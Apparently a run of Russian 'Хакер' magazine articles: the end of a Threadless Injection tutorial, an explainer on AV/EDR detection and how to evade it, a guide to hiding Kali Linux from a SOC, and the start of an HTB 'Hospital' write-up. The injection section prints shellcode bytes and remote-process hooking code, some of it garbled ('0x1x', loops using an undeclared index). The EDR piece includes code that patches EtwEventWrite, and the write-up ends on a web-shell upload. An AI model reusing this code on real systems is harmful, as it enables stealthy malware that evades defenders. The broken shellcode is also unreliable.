        0x1x, 0x20, 0x48, 0x01, 0xFE, 0x8B,
        0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C,
        0x1x, 0x8D, 0x52, 0x02, 0xAD, 0x81,
        0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45,
        0x7x, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
        0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE,
        0x4x, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
        0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D,
        0x5x, 0x5E, 0x5B, 0xC3
};

Далее читаем начало экспортируемой из DLL функции и настраиваем
при помощи получен ных данных трамплин:


    int64_t originalBytes = *(int64_t*)dll_export_fun_addr;
  // Трамплин не повреждается — в нем по этому смещению место
зарезервировано нулями
    *(uint64_t*)(tramp_to_shellcode + 0x12) = originalBytes;

Те перь настраиваем память и даем ей права PAGE_EXECUTE_READWRITE
для установки хука:


DWORD saveProtectFlags = 0;
if (!VirtualProtectEx(hProc, dll_export_fun_addr, 8,
PAGE_EXECUTE_READWRITE, &saveProtectFlags)) return 1;

Создаем хук (call) в экспортной функции ата куемой биб лиотеки и нас тра-
иваем его:


// Опкод функции call
unsigned char call_opcode_to_shell[] = { 0xe8, 0, 0, 0, 0 };
int call_addr = (remoteAddress - ((UINT_PTR)dll_export_fun_addr + 5))
;


// Настраиваем вызов
*(int*)(call_opcode_to_shell + 1) = call_addr;

Далее заканчиваем записы вать трамплин и полез ную нагрузку, а затем меня-
ем атрибуты целевой памяти сначала на PAGE_EXECUTE_READWRITE, потом
обратно на PAGE_EXECUTE_READ, когда работа будет выполнена:


    VirtualProtectEx(hProc,
            call_opcode_to_shell,
            sizeof(call_opcode_to_shell),
            PAGE_EXECUTE_READWRITE,
            NULL);


    if (!WriteProcessMemory(hProc,
            dll_export_fun_addr,
            call_opcode_to_shell,
            sizeof(call_opcode_to_shell),
            &numOfWrittenBytes))
    return 1;


    unsigned char mypayload[sizeof(tramp_to_shellcode) + sizeof(
shellcode)];


  // В этих двух циклах создаем один большой пейлоад из шелл-кода и
трамплина
    for (size_t x = 0; x < sizeof(tramp_to_shellcode); ++x)
        mypayload[i] = tramp_to_shellcode[i];


    for (size_t x = 0; x < sizeof(shellcode); ++x)
        mypayload[sizeof(shellcode) + i] = shellcode[i];


  // Меняем флаги доступа к памяти для проведения записи
    if (!VirtualProtectEx(hProc,
            remoteAddress,
            sizeof(mypayload),
            PAGE_READWRITE,
            &saveProtectFlags))
    return 1;


  // Записываем полезную нагрузку
    if (!WriteProcessMemory(hProc,
            remoteAddress,
            mypayload,
            sizeof(mypayload),
            &numOfWrittenBytes))
    return 1;


  // Возвращаем права доступа к памяти обратно
    if (!VirtualProtectEx(hProc,
            remoteAddress,
            sizeof(mypayload),
            PAGE_EXECUTE_READ,
            &saveProtectFlags))
    return 1;

Пос ле выпол нения всех шагов оста ется только ждать, пока при ложе ние
вызовет пропатченную функцию. Но ждать долго не придет ся, мы ведь
использовали монитор фун кций WinAPI и убедились, что API, которая подвер-
глась модификации, вызывается регулярно.


ÂÛÂÎÄÛ

Сегод ня ты узнал, как реализуется техника внед рения и исполне ния кода
Threadless Injection, то есть без явно го вызова функций соз дания потока.
Это ломает привычный шаб лон инжектов, что позволит нашему уйти от детек-
та и про должить работать.
  Конечно, написанный выше код — это всего лишь демонстра ция и некий
шаб лон, который можно значительно улучшать, что бы добиться еще более
надеж ной невиди мости. Кроме того, эта тех ника не панацея и не серебряная
пуля, которая сделает код полностью скры тым: все техники (инжекта, вызова
API, обфуска ции кода и прочие) нуж но использовать сов местно, а не по оди-
ночке, тогда у ред тимеров будет шанс победить!
ВЗЛОМ





В  «Хакере»  час то обсужда ется скрытие
про цессов и системных вызовов, обфуска-
ция кода и прочие спо собы обхо да AV/EDR.
Но что, если ты хочешь не толь ко следовать
инс трукциям, но и самостоятельно искать              Nik Zerof                                                                                              xtahi0nix@gmail.com
такие    тех ники?   Для   это го   нужно
как минимум понимать общие прин ципы
работы антивиру сов и EDR. Эти прин ципы
мы и обсу дим.


В статье про Process Ghosting я вкратце описал, как работают системы EDR,
а в этой поп робую более подробно рассказать о том, как EDR ловят злоб ный
код, и нем ного о том, как эти методы обхо дят соз датели малвари и пен-
тестерских инструмен тов.




                        Статья имеет озна комительный характер и пред-
                       назна чена для специалис тов по безопас ности,
                      про водящих тестирова ние в рамках контракта.
                       Автор  и  редак ция  не  несут  ответс твенности
                        за любой вред, причинен ный с применением
                       изложенной информа ции. Распространение вре-
                      донос ных прог рамм, наруше ние работы систем
                      и  нарушение  тайны  переписки  прес ледуются
                      по закону.



ÑÒÀÒÈ×ÅÑÊÈÅ ÑÈÃÍÀÒÓÐÛ

Это самый простой и старый метод обна руже ния мал вари. На разных эта пах
сво его развития сигнатурный метод обна руже ния пред ставлял собой просто
спи сок контроль ных сумм вре доносных фай лов, с которым сверял ся проверя-
емый образец. Такой метод быстро изжил себя, ведь чтобы изменить кон-
трольную сум му фай ла, достаточно малей шей прав ки в нем.
  Со временем сиг натур ный метод обнаружения претерпел некоторые
изме нения: скажем, сегодня вполне могут использоваться бай товые пос-
ледовательности, и не только статичные, но и плавающие. Например, вот так
выглядит  детектиру ющая последовательность YARA-скрипта  для одно го
из творений груп пы Lazarus:


$scan_1 = { d1 ?? 33 ?? fc 81 ?? ff 00 00 00 c1 ?? 17 }

Здесь представ лена как раз плавающая байтовая сиг натура: на месте знаков
вопроса могут быть любые байты, но детект все равно сработа ет.
   Сигнатуры могут вклю чать в себя не только шес тнад цатерич ные байтовые
пос ледовательности, но и стро ки, встречающиеся в мал вари:


$scan_2 = "%s\\~%d.tmp" wide ascii

Кро ме того, под детект могут попасть контроль ные суммы таблицы импорта
или, нап ример, Rich-сиг натуры. Словом, все, что может однозначно говорить,
что перед нами именно искомый файл, а не какой-то дру гой. Подобные сиг-
натуры таким же способом можно искать в памяти. Сегодня этот метод ска-
нирования часто работает в связке с другими метода ми обнаружения мал-
вари.




Нап ример, упаковщики или протекторы! Они могут:
 • ме нять набор импортов и бай товые последовательнос ти;
 • встав лять в код малвари свои кодовые антиотла дочные блоки, содер-
  жащие длинные цик лы или вызовы функций WinAPI;
 • шифровать код и рас шифровывать его только в памяти, в том чис ле кус-
   ками (расшифровали → выполнили кусок → зашифровали обратно → рас-
  шифровали следующий кусок и так далее);
 • прев ратить код в пос ледова тельность пи-кода для своей виртуальной
  машины;
 • ме нять энтропию зашифрованных данных малвари;
 • де лать мно гие другие изменения в файле.




ÑÊÀÍÈÐÎÂÀÍÈÅ ÏÀÌßÒÈ

Сканиро вание памяти тоже часто используется средствами EDR, но работает
оно не постоянно (из-за оптимиза ций про изводитель ности), а час то запус-
кается из-за ком про метирующих последова тельностей действий, например:
 • заг рузка определенных биб лиотек;
 • выполнение опре деленной последовательности WinAPI;
 • запись данных в память (свою или чужую);
 • запись данных в определенные ключи реестра.

Другими словами, сканиро вание часто запускается по сиг налу от поведен-
ческого анализатора, который наблюда ет дос таточ ное количество негатив-
ных флагов в поведе нии процесса.
  В свою очередь, вредоносное ПО час то исполь зует шифрование в качес-
тве  противо ядия  от  сканирования  памяти: шифрование  может  быть
как целого образа, так и фраг ментами с последующим исполне нием. Кро ме
того, шифровать ся может не только сам исполняемый файл или шелл-код
целиком, но и строки, которые могут выз вать подозрение сканера. Нап ример,
некоторые вирмейкеры просто ука зывают в своем коде пря мым текстом
что-то такое:


HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

А потом удивляют ся, почему что-то идет не так!
  При этом нельзя полагаться на шифрование методом XOR: когда-то
это было популярно и модно (работа ет быстро и реализуется на раз), но сей-
час подобные вещи легко детектятся теми же правила ми YARA. Зато работе
EDR по-преж нему мешает шиф рование Heap.
  Кроме стандартных байтовых пос ледова тельнос тей, характерных, к при-
меру, для шелл-кодов, EDR могут смот реть и на атрибуты страниц памяти.
Как извес тно, память может быть читаемой (read, R), записы ваемой (write, W)
или исполняемой (execute, X). И если память выделя ется с атрибутами RWX,
то это авто матически обра тит на себя внимание EDR, потому что при нор-
мальном выполнении такие атрибуты выда ются очень редко и только спе-
цифи ческому соф ту.


ÒÐÀÑÑÈÐÎÂÊÀ ÑÎÁÛÒÈÉ WINDOWS ETW

Часто средс тва EDR опираются на трас сировку событий ETW, которая поз-
воля ет получать весьма детальную информацию о запуске функций WinAPI,
про цессах, драйверах и подобных вещах. Сам механизм трассировки рас-
полага ется как в режиме ядра, так и в режиме пользователя в фай ле ntdll.
dll (функции EtwEventWrite и EtwEventWriteFull).
   Так как часть механизма — в пользователь ском режиме, мы можем
на  него  воздей ствовать, например пропатчив функции EtwEventWrite
и EtwEventWriteFull. Конеч но, EDR может кон тролировать целос тность
WinAPI и обломать малвари всю малину. Но в силах вирусо писа теля
испортить функцию NtTraceEvent  (в которую упираются EtwEventWrite
и EtwEventWriteFull) непосредственно в момент вызова ядра. Впрочем,
это уже отдельная история. Вот пример патчинга EtwEventWrite:


  // Заглушка
  unsigned char eew_patch[] = { 0x48, 0x33, 0xc0, 0xc3};
  unsigned char sEEW[] = { 'E','t','w','E','v','e','n','t','W','r',
'i','t','e', 0x0 };


  int size = sizeof(eew_patch);
  ULONG OldAccessProtection = 0;


  HANDLE hProcess = GetCurrentProcess();
  void *pEew = GetProcAddress(GetModuleHandle((LPCSTR) L'ntdll.dll'),
(LPCSTR) sEEW);


  if(!pEew) return 1;


  // Разрешаем записывать память
  NtProtectVirtualMemory(hProcess,
          &pEventWrite,
          (PSIZE_T) &size,
          PAGE_READWRITE,
          &OldAccessProtection);
  // Патчим
  memcpy(pEew, eew_patch, size / sizeof(eew_patch[0]));


  // Меняем права памяти обратно
  NtProtectVirtualMemory(hProcess, &pEew, &size, OldAccessProtection,
&OldAccessProtection);
}

На крайний случай можно использовать недоку ментированную функцию
EtwpDisableStackWalkApc, которая применя ется для отключения процес са
Stack Walking (получения стека вызовов) в рамках механизма APC.


ÏÅÐÅÕÂÀÒ API

Еще один способ детекта осно ван на перехвате функций WinAPI и NTAPI.
Это позволяет системам EDR и AV отсле живать вызовы и смотреть парамет-
ры, с которыми вызываются функции. Естес твенно, эта информа ция переда-
ется поведенческо му анализатору.
  В первом, самом прос том приб лижении механизм перехвата я описывал
в статье «Вол шебные хуки», да и в других тоже затрагивал. Суть метода зак-
люча ется в том, что производится инжект монито рящей DLL в процесс и даль-
нейшая обработ ка событий вызова нужных WinAPI. Кро ме этого, защитное
средство может патчить начальный код в ntdll.dll, чтобы мониторить NTAPI.
  Для про тиво дей ствия этому существует много методов обхода. Например,
в статье «Врата ада» описаны прямые и непрямые (indirect) вызовы функций
API. Кроме того, мож но попробовать снять непос редственно сами хуки
в ntdll.dll. Если смот реть по общей эффектив ности, то, на мой взгляд,
перспективнее все го техника непрямых вызовов. Среди ее плюсов:
 • В коде нет захардкоженных номеров системных вызовов, они получа ются
  динамически. Это снимает вопрос с тем, что номера вызовов в сис темной
   таб лице сервисов могут неп редсказуемо меняться (что они и делают, если
   срав нить их в разных вер сиях Windows).
 • Точ ка вызова ядра будет не в нашем процессе, а, как ей и положе но,
   в файле ntdll.dll.
 • Будет отсутс твовать сам опкод инструкции syscall в коде. Ведь в обыч-
   ных при ложе ниях такой опкод не встречается практичес ки никогда.


ÏÎÂÅÄÅÍ×ÅÑÊÈÉ ÀÍÀËÈÇ

Этот вид детекта вредонос ного кода считает ся одним из самых эффектив ных,
хотя он и более рискованный. Если анти вирус решит, что перед ним вре-
доносное ПО, он сразу же завер шит процесс. Но если это было ошибкой, то
поль зователь может потерять данные или результаты работы. Если такое
будет повторять ся часто, то юзер либо отключит, либо снесет анти вирус, ну
или будет мучить адми нов организации, и они сде лают что-нибудь нехоро шее
с EDR — ослабят полити ки или (о ужас!) перей дут к другому вендору.
   Суть поведенческо го детекта, как ты можешь догадаться, заключается
в том, что анти вирус анализирует поведе ние программы. Час то можно
выделить опре деленный шаб лон харак терных вре доносных активностей. Нап-
ример, вот дей ствия, которые нуж но пред принять для реализации Process
Doppelgänging:
 1. Соз дать транзакцию NTFS при помощи функции CreateTransaction.
 2. В кон тексте тран закции создать временный файл для вредоносного кода
   при помощи функции CreateFileTransacted .
 3. Соз дать в оперативной памяти буферы для времен ного файла (объект
   «секция», функция NtCreateSection).
 4. Настроить PEB для запус ка кода свежесозданной сек ции.
 5. Запустить процесс при помощи NtCreateProcessEx->ResumeThread.

В этом при мере вни мание привлекает вызов ред ких WinAPI для работы
с транзакциями и функция NtCreateProcessEx, которая вообще ста ла крас-
ной тряп кой для всех систем EDR. Да, можно какие-то шаги переписать
при помощи других функций с нужными воз можнос тями, но общая логика
будет именно такая. И таких «шаблонов» EDR зна ет много, например:
 • один про цесс запускает другой из файла в определенной дирек тории;
 • что-то записы вается в автозагрузку;
 • один про цесс пишет в память другого;
 • с дис ка читаются «интересные» DLL, например ntdll.dll;
 • у фай ла, который выполняет эти действия, нет цифровой подписи.

Идея обхода подоб ного анализа сводится либо к максималь ному скры тию
сво их дей ствий (те же непрямые сисколы), либо к мимикрии под «легаль ные»
пос ледовательности дей ствий, чтобы вызвать максимальное количество лож-
ных срабатываний и заставить пользователя отклю чить защиту. Либо можно
ста раться раз рывать цепочку действий (хотя бы во времени), используя тех-
ники сна.
  Нап ример, шиф рование данных можно реали зовать при помощи стандар-
тных крип тофункций WinAPI, и это сразу же привлечет вни мание. А можно
использовать    недокументированную   фун кцию    SystemFunction032
из Advapi32.dll, которая реализует RC4, и юзать для шифрования уже ее,
что будет весьма вне запно для EDR. А если еще и код будет зашифрован
при помощи Heap, то детект точ но получится обойти.


ÒÐÀÑÑÈÐÎÂÊÀ ÑÒÅÊÀ

Достаточно сложная и могучая тех ника — реконс трукция последова тель ности
вызовов функций (стек вызовов). Для каждого потока создает ся свой стек
вызовов. При вызове функции для нее соз дается стековый фрейм, содер-
жащий в себе аргументы функции, локальные переменные, необходимые
для последующего вос станов ления регис тры и обратный адрес — тот, куда
передастся управле ние, когда функция отра ботает. Дру гими словами, стек
представ ляет собой  упорядочен ный набор адресов  воз врата функций,
которые вызывались при выполнении программы. Пос мотрим, как это устро-
ено:


void func2(int a, int b) {
    int c = a + b;
}


void func1() {
    func2(10, 20);
}


int main() {
    func1();
    return 0;
}

По шагам:
 • main() вызывает func1() , и адрес возвра та func1() добавляется
   в стек (ведь стек имеет структуру LIFO — первым вошел, последним
   вышел);
 • func1() вызывает func2() , адрес воз вра та func2() тоже добавляется
   в стек;
 • func2() — это верхняя функция в стеке вызовов;
 • когда func2() завер шится, из стека будет удален адрес возврата,
   и выпол нение перей дет к func1() ;
 • после завер шения func1() из стека точ но так же удалится адрес воз вра-
    та, и управление вернется к main() .

Системы EDR могут монито рить стек вызовов, что бы анализировать пос-
ледовательность работы функций. Но в нашем примере только наш код,
а EDR уме ют точно так же реконс труиро вать последовательность вызовов
WinAPI.
  Получив алерт от поведенческого ана лиза тора, EDR зах ватит состояние
сте ка вызовов, сох ранит последовательность вызовов функций и начнет раз-
матывать его в поисках ано малий в обратном порядке, начиная с текуще го
момен та и дви гаясь к корню стека.
   Вот пара примеров исполь зования этой тех ники. Защитное средс тво
может перехватить выделяющие память фун кции WinAPI и искать адрес воз-
врата, указывающий на вредоносный код. Как вариант, анти вирус может
прос ледить   стек   до   таких   фун кций,   как   RtlUserThreadStart
или BaseThreadInitThunk (точ ки входа для пользовательских потоков после
их соз дания), что бы убедиться, что поток соз дан «нормаль ным» обра зом.
  Конечно, вредоносный код может про тивос тоять и этим техникам. Нап-
ример, сущес тву ет такая шту ка, как Spoong Call Stacks — подделка сте ка
вызовов с изменением обратных адресов. Это позволяет запутать след
и сбить с толку функции трассировки стека EDR.


ÂÛÂÎÄÛ

В этой статье я постарался рас ска зать, как имен но антивиру сы и EDR детек-
тят вре донос ный код. Конечно, я перечислил не все средства: за кадром
остались математические модели анализа поведения, песоч ницы, облачный
ана лиз и прочие ухищ рения. Однако мы прошлись по основной логике детек-
та вре донос ного кода, а это самое глав ное.
ВЗЛОМ





Дис трибутив Kali Linux невероятно популя-
рен среди пен тестеров. Одна ко при про-
ник новении в сеть с нас тройками по умол-
чанию он может соз дать мно го шума в эфи-
ре, который не останется незамечен ным.               Caster                                                                                                      caster@exploit.org
В этой статье я расскажу о харденинге Kali
и о том, как научить Linux работать в наибо-
лее тихом режиме.




                        Статья имеет озна комительный характер и пред-
                       назна чена для специалис тов по безопас ности,
                      про водящих тестирова ние в рамках контракта.
                       Автор  и  редак ция  не  несут  ответс твенности
                        за любой вред, причинен ный с применением
                       изложенной информа ции. Распространение вре-
                      донос ных прог рамм, наруше ние работы систем
                      и  нарушение  тайны  переписки  прес ледуются
                      по закону.


Что бы можно было автоматизировать нас трой ку, я недавно зарелизил инс-
трумент F31, написанный на Bash. Дальше мы подробно раз берем, что имен-
но он делает.
   Эта статья и F31 не гарантируют тебе стопроцентный обход сис тем,
за которыми приглядыва ет SOC, но ты зна читель но снизишь вероятность
спалиться. Каж дый пентест  сети  уникален, и  написать  универ сальное
решение вряд ли возможно. Уверен, что есть и дру гие способы уменьшить
шум в эфире. Но мы сос редоточимся на глав ных моментах.


ABOVE

Above — еще один мой инстру мент, это сетевой сниффер про токолов
для поиска уязвимостей в сетевом оборудо вании. Его работа основана толь-
ко на анализе трафика, что не создает никакого шума в эфире.
  Он охватывает следующие протоколы:
 • L2: CDP, LLDP, DTP, 802.1Q Frames;
 • L3: OSPF, EIGRP, VRRP, HSRP;
 • L7: LLMNR, NBT-NS, MDNS, SSDP, MNDP.

Кста ти говоря, Above недавно вклю чили в Kali Linux! Ты можешь установить
его прямо из репози ториев Kali:


sudo apt update && sudo apt install above
above --help

Что бы начать анализировать трафик:


sudo above --interface eth0 --timer 250 --output-pcap vettel.pcap

Здесь
 • --interface eth0 — интерфейс сис темы;
 • --timer 250 — время, в течение которо го будет проводиться анализ;
 • --output-pcap — файл дам па трафика, куда Above запишет все, что
  смо жет найти.





                     Пример работы Above

С помощью Above можно искать векторы атак на сеть и при этом не создавать
никакого шума в эфи ре.


ÎÁÐÀÙÅÍÈÅ Ê ÐÅÏÎÇÈÒÎÐÈßÌ

Ес ли во вре мя работы в сети в рамках пен теста ты обратишься к репози тори-
ям Kali, имей в виду, что SOC может сра зу обна ружить это действие. Даже
если включить обращение к репозиториям через HTTPS, ты все равно
можешь спалиться по DNS-зап росу.





ÎÏÅÐÀÖÈÈ Ñ ÕÎÑÒÍÅÉÌÎÌ ÑÈÑÒÅÌÛ

Да-да-да, совет менять хостнейм Kali — это страшный баян. Тем не менее
дефолтный хос тнейм Kali так и остается главным инди катором обнаружения
этого дистра в сети.
  Ре шение простое до безобразия. Мы не только поменяем имя сис темы,
но и заодно запретим переда чу хос тней ма в пакетах DHCP, которые уходят,
когда атакующий пыта ется получить адрес в сети.


sudo hostnamectl set-hostname DESKTOP-HNA2AEVS
sudo sed -i "s/127.0.1.1.*/127.0.1.1\tDESKTOP-HNA2AEVS/" /etc/hosts

Отключить переда чу имени системы по DHCP можно в connection-файлах
NetworkManager, добавив параметр dhcp-send-hostname=false:


sudo sed -i '/\[ipv4\]/a dhcp-send-hostname=false' /etc/
NetworkManager/system-connections/Wired\ connection\ 1


TTL

Для дистри бутивов Linux зна чение TTL равно 64. Можно изменить стандар-
тное зна чение TTL в системе. Если хочешь при кинуть ся Windows, выбирай TTL
128.


sudo sysctl -w net.ipv4.ip_default_ttl= 80

Ес ли у тебя планы проводить MITM в сети, то можешь скрыть свой адрес
в трассировке со сто роны легитим ных хостов. Очень прос той трюк в виде
сме щения TTL с инкре ментом +1:


sudo iptables -t mangle -A PREROUTING -i eth0 -j TTL --ttl-inc 1


ÎÒÊËÞ×ÅÍÈÅ NTP

Твоя система может периодически обра щаться к NTP-серверу для синхро-
низации актуального времени. В Kali периоди чески происходит обращение
к NTP по име ни DNS.





Зато отключить синхрониза цию времени в Kali очень просто:


sudo systemctl stop systemd-timesyncd


ÐÀÁÎÒÀ Ñ NETFILTER

Нам нуж но разрешить установленные и связанные между собой соеди нения,
блокиро вать некорректные и блокировать TCP-сег менты с неожи данными
зна чениями TCP MSS. А так же фильтро вать ICMP-трафик и выключить пинги.
Однако будь осторожен: не заблокируй случай но ICMP Type 3, который поз-
воля ет системе PMTUD избегать избыточной фрагментации.


sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j
ACCEPT
sudo iptables -t mangle -A PREROUTING -m conntrack --ctstate INVALID
-j DROP
sudo iptables -A INPUT -p icmp --icmp-type 0 -m conntrack --ctstate
NEW -j ACCEPT
sudo iptables -A INPUT -p icmp --icmp-type 3 -m conntrack --ctstate
NEW -j ACCEPT
sudo iptables -A INPUT -p icmp --icmp-type 11 -m conntrack --ctstate
NEW -j ACCEPT
sudo iptables -A INPUT -p icmp -j DROP
sudo iptables -t mangle -A PREROUTING -p tcp -m conntrack --ctstate
NEW -m tcpmss ! --mss 536:65535 -j DROP




                     Ог раничение ICMP-трафика на твоем хосте может
                       повлиять на кор ректную работу ICMP-сканиро-
                         вания. Имей это в виду, если будешь его исполь-
                          зовать.  Отслеживай  типы  ICMP-сооб щений,
                       которые фильтруются.



ÎÒÊËÞ×ÅÍÈÅ ICMP REDIRECT

Ре директы ICMP случаются при MITM-атаках. На сообщения ICMP redirect
могут стриг гериться системы IDS/IPS, что ском прометирует действия ата-
кующего. Давай выключим эти сообщения.


sudo sysctl -w net.ipv4.conf.all.accept_redirects= 0
sudo sysctl -w net.ipv6.conf.all.accept_redirects= 0


ÐÀÍÄÎÌÈÇÀÖÈß MAC-ÀÄÐÅÑÀ

Классика жанра: смена MAC-адреса на своем интерфей се. Думаю, пояснять
этот пункт нет необ ходимости.


sudo ifconfig eth0 down
sudo macchanger -r eth0
sudo ifconfig eth0 up

Также можно настро ить NetworkManager так, что бы при каждом подключении
к сети MAC-адрес менялся на случайный.


echo -e "\n[connection]\nwifi.cloned-mac-address=random\n\n[
connection]\nethernet.cloned-mac-address=random" | sudo tee -a /etc/
NetworkManager/NetworkManager.conf


ÌÈÍÈÌÈÇÀÖÈß ØÓÌÀ

Пентестеры вынуж дены в своей работе исполь зовать сканеры (Netdiscover,
Nmap и про чие), однако при запуске с уста новками по умол чанию эти ска-
неры создают очень боль шой шум в эфире. Мало того что повыша ется риск
ком про метации действий ата кующего, так еще есть вероятность перегрузить
сетевой ком мутатор (особенно если мы говорим о быстром ARP-сканиро-
вании). Тре вогу может забить и сис тема Storm Control, которая управляет
огра ниче ниями лимитов UCAST/MCAST/BCAST-трафика.
  Я нашел возможность миними зировать шум в эфире с помощью ограниче-
ния ско рос ти на интерфей се системы. Можно резать скорость на интерфейсе
до 30 Кбит/с, выставив задержку 800 мс, чтобы тот же Netdiscover не вызывал
перегрузку в эфире. Разумеется, такой фикс повлияет на ско рость работы
сканера и скорость переда чи данных, но все это только ради избе жания
перегрузки. Значения я определил в своих наблюдениях, однако не стес няй-
ся регулировать их при необходимос ти.
  Для шей пин га я использовал ути литу tc (traﬃc control):


sudo tc qdisc add dev eth0 root tbf rate 30kbit burst 30kbit latency
800ms

Ни же скриншоты с работой ска неров Netdiscover и Nmap. Команды запус ка
были сле дующие:


sudo netdiscover -i eth0
sudo nmap -n 10.10.100.0/24

Об ращай вни мание на Outgoing — утилита nload показывает этот исходящий
трафик (когда ты что-то сканиру ешь — это исходящий трафик).





              Работа Netdiscover без шейпинга трафика





                  Работа Netdiscover с шейпингом





                 Работа Nmap без шей пин га трафика





                    Работа Nmap с шейпингом

Ес ли нужно удалить параметры огра ничения трафика, то для этого есть вот
такая коман да:


sudo tc qdisc del dev eth0 root


F31

Итак, я написал скрипт F31 для авто матизации всего процесса нас тройки.
Скрипт полностью настраивает ся, и запускать его нужно со спе циальными
аргументами.



  sudo bash F31.sh
  ███████ ██████   ██
  ██           ██ ███
  █████    █████   ██
  ██           ██  ██
  ██      ██████   ██


  F31: Tool for hiding Kali Linux on the network
  Author: Caster, @wearecaster, casterinfosec@gmail.com
  Version: 1.0.0
  For instructions and an example of how to use it, visit:
  https://github.com/wearecaster/F31
  Usage: F31.sh --interface  --new-hostname  [--noise-reduction]


  Options:
    --interface       Specify the network interface to hide
    --new-hostname    Specify the new hostname for the system
    --noise-reduction Enable traffic shaping for noise reduction
  (optional)


Здесь
 • --interface — указываешь сетевой интерфейс сво его Kali Linux;
 • --new-hostname — новый хостнейм для сво его Kali Linux;
 • --noise-reduction —  акти вация  того  самого шейпинга  трафика
   для миними зации шума в эфире. Параметр опциональный, включай его
   при необходимос ти.


sudo bash F31.sh --interface eth0 --new-hostname DESKTOP-HNA2AEVS
--noise-reduction

На случай, если понадобит ся отка тить все изменения, я написал скрипт
reset.sh, ты сможешь его найти в этом репозитории:


sudo bash reset.sh --interface eth0 --old-hostname kali


ÂÛÂÎÄÛ

Я рас сказал об основных иде ях по поводу минимизации шума в эфи ре и хар-
денинга Kali Linux. Акцент всех эта пов настройки Kali Linux сделан именно
на сетевом уровне. Написать полноцен ный мануал по обходу SOC вряд ли
воз можно, тем более всё не уместить в одну статью. Думаю, в будущем ты
можешь ждать новые час ти Kali Ashes.
ВЗЛОМ





В этом райтапе мы используем уязвимость
внедрения команд в Ghostscript с целью
фишин га. Также получим сессию в Docker
через загрузку веб-шелла и повысим при-
виле гии в Docker через GameOverlay.                         RalfHacker                                                                                             hackerralf8@gmail.com

Наша цель — получе ние прав суперпользователя на машине Hospital с учеб-
ной площадки Hack The Box. Уро вень слож ности машины — средний.




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ

Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.241   hospital.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Наш ли множество пор тов:
 • 22 — OpenSSH 9.0p1;
 • 53 — DNS;
 • 88 — Kerberos;
 • 135 — Microsoft RPC;
 • 139 — сервис сеансов NetBIOS, NetLogon;
 • 389 — LDAP;
 • 443 (HTTPS) — веб-сер вер Microsoft IIS/10.0;
 • 445 — SMB;
 • 464 — служба сме ны пароля Kerberos;
 • 593 (HTTP-RPC-EPMAP) — использует ся в служ бах DCOM и Exchange;
 • 636 — LDAP с шиф рованием SSL или TLS;
 • 3268 (LDAP) — нужен для доступа к Global Catalog от клиента к контрол-
   леру;
 • 3269 (LDAPS) — нужен для дос тупа к Global Catalog от клиента к контрол-
   леру через защищенное соединение;
 • 5985 — служба удаленного управления WinRM;
 • 8080 — веб-сервер Apache 2.4.55;
 • 9389 — веб-сервер службы AD DS.

В результатах сканиро вания отмечаем имя хос та и домена, поэтому добав-
ляем наши наход ки в /etc/hosts:


10.10.11.241   hospital.htb DC.hospital.htb

Затем проверяем сайты на обоих веб-серверах. И на том и на дру гом нас
встре чают формы авто ризации.





                     Главная стра ница hospital.htb





                   Главная страница hospital.htb:8080


ÒÎ×ÊÀ ÂÕÎÄÀ

У нас есть воз можность зарегистри роваться, так что обязательно сделаем
это. Авто ризо ванному пользователю дос тупна форма загрузки фай лов.





                   Главная страница hospital.htb:8080

Заг ружаем тестовый файл без каких-либо проблем. Если сможем найти этот
файл на сервере, то это даст возможность загрузить бэкшелл.





                     Зап рос на загрузку файла

Что бы най ти, куда загрузился файл, можно просканиро вать катало ги сайта.




Одно из пер вых действий при тес тировании безопасности веб-приложе-
ния — это сканиро вание методом перебо ра каталогов, чтобы найти скры тую
информацию и недоступные обыч ным посети телям функции. Для этого можно
использовать программы вроде dirsearch, DIRB или ﬀuf. Я предпочитаю
feroxbuster.
  При запуске указываем следующие параметры:
 • -u — URL;
 • -w — словарь (я использую сло вари из набора SecLists);
 • -t — количество потоков;
 • -d — глу бина сканирования.



Запускаем feroxbuster :


feroxbuster -u http://hospital.htb:8080/ -t 128 -d 1 -w directory_2.
3_medium_lowercase.txt





        Ре зультат ска нирования катало гов с помощью feroxbuster

Я не стал дожидаться окончания ска нирования, так как с первых же зап росов
нашел ся каталог uploads. Поищем наш файл там.


curl 'http://hospital.htb:8080/uploads/test.txt'





                        Зап рос на сервер

Видим содер жимое нашего файла, а зна чит, можно переходить к загрузке
шелла.


ÒÎ×ÊÀ ÎÏÎÐÛ

Как толь ко мы про буем заг рузить файл .php, получаем ошибку. Не все так
прос то, как казалось на пер вый взгляд! Но .php — не единственное рас-
ширение фай лов, которое поз воляет выпол нять код на веб-сер вере. Переб-
рать все варианты можно с помощью Burp Intruder.





                    Burp Intruder — вкладка Positions

Что бы в таб лице результатов появил ся ответ сервера, мож но перейти
на вкладку Settings к настрой ке Grep — Extract и добавить правило, которое
будет выбирать нужный фраг мент страницы.





                    Burp Intruder — вкладка Settings

Запускаем перебор в один поток и получа ем список рас ширений, которые
можно использовать при загрузке.





                        Результат ата ки

Тут же столкнулись со вто рой проблемой: не каждый шелл отрабаты вает.


curl 'http://hospital.htb:8080/uploads/test_upload.phar?cmd=id'




                       Зап рос к веб-шел лу

